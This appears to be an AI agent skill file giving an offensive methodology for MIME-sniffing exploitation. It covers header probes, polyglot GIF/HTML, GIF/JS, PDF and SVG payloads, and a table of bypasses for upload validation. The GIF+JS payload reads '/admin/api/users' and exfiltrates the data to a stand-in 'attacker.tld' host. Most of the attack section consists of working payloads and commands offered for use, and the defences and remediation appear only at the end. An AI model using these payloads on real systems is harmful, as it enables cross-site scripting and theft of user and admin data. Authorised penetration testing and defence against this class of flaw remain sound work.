---
name: offensive-mime-confusion
description: "MIME confusion / content-type sniffing exploitation when X-Content-Type-Options: nosniff is absent. Covers polyglot file construction (GIF/HTML, GIF/JS, PDF/JS, JPEG/SVG), upload endpoint enumeration, Chrome CORB bypasses for legacy MIME, IE/Edge sniffing legacy behaviour, and the upload→fetch→XSS chain end-to-end."
---

# MIME Confusion (Content-Type Sniffing) — Offensive Methodology

## Quick Workflow

1. Confirm `X-Content-Type-Options: nosniff` is absent on user-content
   endpoints (uploads, attachments, avatars, share links).
2. Find a user-controlled upload endpoint that returns the file with a
   sniffable / wrong Content-Type.
3. Build a polyglot file — looks valid as image, but the byte stream also
   parses as HTML/JS.
4. Upload, fetch the returned URL, confirm script execution.

---

## Detection

```bash
# 1. Header probe on a typical upload-served URL
curl -skI https://target.tld/uploads/2026/avatar.jpg | grep -iE 'x-content|content-type'

# 2. Upload-endpoint discovery
curl -s https://target.tld/ | grep -iE 'enctype="multipart|<input[^>]*type="file"'

# 3. Test for sniff behaviour: upload a file whose content disagrees with extension
echo '<html><body><script>alert(1)</script></body></html>' > /tmp/test.gif
# Upload it as an "image", then fetch the returned URL in a browser
```

Vulnerable signals:

* `X-Content-Type-Options` absent on `/uploads/`, `/files/`, `/attachments/`,
  `/avatars/`, `/static/user-content/`
* Server returns the file with `Content-Type: text/html` or with no
  Content-Type at all (browser falls back to sniffing)
* CDN in front strips `X-Content-Type-Options` (common with misconfigured
  Cloudflare workers)

---

## Polyglot Construction

### GIF + HTML (oldest, most reliable)

```
GIF89a;<script>alert(document.domain)</script>
```

This 8-byte GIF header is enough for IE/old Edge to accept the file as image
during validation, while the embedded script executes when the file is later
served as HTML (because the server lied about Content-Type or didn't set one).

For browsers that validate magic bytes more strictly:

```
GIF89a/* <bytes that form a 1x1 transparent GIF> */;
<script>alert(document.domain)</script>
```

### GIF + JavaScript

Useful when the upload endpoint serves files inline and the page references
the upload URL as `<script src="/uploads/x.gif">`.

```js
GIF89a=1; /* GIF magic interpreted as JS variable assignment */
fetch('/admin/api/users').then(r=>r.json()).then(d=>{
  new Image().src = 'https://attacker.tld/exfil?d=' + btoa(JSON.stringify(d));
});
```

The GIF magic bytes become a valid (if useless) JS statement; the rest is your payload.

### PDF + JavaScript

Some PDF viewers and antivirus scanners trip on:

```
%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
%<script>alert(1)</script>
```

Triggers when the file is fetched as `text/html` due to wrong Content-Type.

### JPEG + SVG (modern Chrome via SVG image)

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <image href="data:image/jpeg;base64,/9j/..."/>
</svg>
```

Upload as `evil.jpeg.svg` or trick the endpoint into serving as `image/svg+xml`
(SVG can execute scripts in <img> via `<image>` element on some renderers).

---

## Upload → Execute Chain

### Step 1: Find Upload Endpoints

```bash
# From HAR/crawl, look for multipart POST
grep -E 'multipart/form-data' har.json

# Common paths
for p in /upload /api/upload /files/upload /attachments/new /avatar/upload /api/v1/files; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" -X POST https://target.tld$p
done
```

### Step 2: Bypass Server-Side Validation

| Defence | Bypass |
|---|---|
| Extension whitelist (`.jpg/.png/.gif` only) | Use double extension: `evil.jpg.html`, `evil.gif` (polyglot), `evil.svg` |
| Content-Type header check on upload | Set request `Content-Type: image/gif`; body is polyglot |
| Magic-byte check | Use real GIF89a header + appended script |
| ImageMagick re-encoding | Embed XSS in EXIF metadata that survives transcoding, or upload SVG (often passes through unmodified) |
| Filename sanitisation | URL-encode the dot: `evil%2egif%2ehtml` |

### Step 3: Fetch and Execute

If the upload returns a URL like `https://target.tld/uploads/abc123.gif`, just
visit it. Browser sniffs the content (because nosniff is absent) and executes.

If the upload is referenced via `<img>`/`<script>` in a target page:

```html
<!-- Victim page after your upload -->
<script src="/uploads/abc123.gif"></script>  <!-- executes your polyglot JS -->
```

---

## Special Cases

### Chrome CORB Bypass

Chrome's Cross-Origin Read Blocking blocks cross-origin responses with HTML
content-type from being read as JS. But if the response has *no* Content-Type,
CORB doesn't trigger and the file is sniffed.

### Service Worker Cache Poisoning

If the site uses a service worker that caches by URL without checking
Content-Type, a polyglot upload can later be served from cache as HTML.

### GitHub Pages / S3 / Backblaze Style Storage

Object storage often serves files based on filename extension. Uploading
`evil.gif` to a misconfigured bucket → served as `image/gif` even if it's HTML
internally; sniff still executes on modern browsers if `X-Content-Type-Options`
isn't injected by the CDN.

---

## Real CVE References

* **CVE-2007-5414** (Apache mod_mime) — sniffing-related misclassification
* **CVE-2014-2719** (multiple browsers) — sniffing of text/plain as HTML
* **GitHub Pages 2017** — `<script>` execution from `.txt` files in user-controlled repos (fixed via `X-Content-Type-Options: nosniff` on all served files)
* **Slack 2019** — SVG profile picture XSS via SVG `<image>` element

---

## Defences You Are Testing Against

* `X-Content-Type-Options: nosniff` on every user-content response
* Strict Content-Type enforcement (image endpoints return only `image/*`)
* Magic-byte AND extension whitelist
* Re-encode all uploaded images server-side (ImageMagick `convert input.gif clean.gif`)
* Separate origin for user content (`user-content.target.tld` with CSP `sandbox`)
* Disposition: `Content-Disposition: attachment` forces download instead of inline render

---

## Remediation (for the report)

```http
X-Content-Type-Options: nosniff
Content-Disposition: attachment; filename="user-file.gif"
Content-Type: image/gif        # honest, not sniffed
```

Plus:

1. Serve user content from a separate cookieless origin
2. Apply CSP `sandbox` to the user-content origin
3. Re-encode all uploaded media server-side
4. Validate magic bytes AND extension AND post-decode dimensions
